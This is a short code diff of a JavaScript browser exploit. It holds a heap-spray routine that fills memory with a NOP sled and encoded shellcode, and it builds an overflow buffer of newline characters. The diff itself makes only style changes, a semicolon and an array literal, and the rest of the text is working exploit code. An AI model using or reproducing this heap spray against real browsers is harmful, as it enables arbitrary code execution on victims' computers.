@@ -25,12 +25,12 @@ shellcode = unescape("%u9090%u9090%u9090%uC929%uE983%uD9DB%uD9EE%u2474" +
 "%uCC4A%uD0FF");    
 bigblock = unescape("%u9090%u9090"); 
 headersize = 20; 
-slackspace = headersize+shellcode.length
+slackspace = headersize+shellcode.length;
 while (bigblock.length<slackspace) bigblock+=bigblock; 
 fillblock = bigblock.substring(0, slackspace); 
 block = bigblock.substring(0, bigblock.length-slackspace); 
 while(block.length+slackspace<0x40000) block = block+block+fillblock; 
-memory = new Array(); 
+memory = [];
 for (x=0; x<800; x++) memory[x] = block + shellcode; 
 var buffer = '\x0a'; 
 while (buffer.length < 5000) buffer+='\x0a\x0a\x0a\x0a'; 
